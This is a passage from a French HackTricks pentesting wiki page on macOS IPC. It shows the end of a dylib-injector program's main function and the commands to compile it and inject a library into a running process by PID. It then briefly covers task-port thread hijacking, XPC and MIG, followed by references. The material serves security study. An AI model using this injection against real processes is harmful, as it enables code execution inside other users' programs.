    fprintf(stderr, "Utilisation : %s _pid_ _action_\n", argv[0]);
    fprintf(stderr, "   _action_ : chemin vers un dylib sur le disque\n");
    exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat(action, &buf);
if (rc == 0) inject(pid, action);
else
{
    fprintf(stderr, "Dylib introuvable\n");
}
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Détournement de thread via le port de tâche <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Dans cette technique, un thread du processus est détourné :

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Informations de base

XPC, qui signifie XNU (le noyau utilisé par macOS) inter-Process Communication, est un framework pour la **communication entre les processus** sur macOS et iOS. XPC fournit un mécanisme pour effectuer des **appels de méthode asynchrones et sécurisés entre différents processus** du système. Il fait partie du paradigme de sécurité d'Apple, permettant la **création d'applications avec des privilèges séparés** où chaque **composant** s'exécute avec **seulement les autorisations nécessaires** pour effectuer son travail, limitant ainsi les dommages potentiels causés par un processus compromis.

Pour plus d'informations sur le fonctionnement de cette **communication** et sur les vulnérabilités potentielles, consultez :

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG a été créé pour **simplifier le processus de création de code Mach IPC**. Il génère essentiellement le code nécessaire pour que le serveur et le client puissent communiquer avec une définition donnée. Même si le code généré est peu esthétique, un développeur n'aura qu'à l'importer et son code sera beaucoup plus simple qu'auparavant.

Pour plus d'informations, consultez :

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Références

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
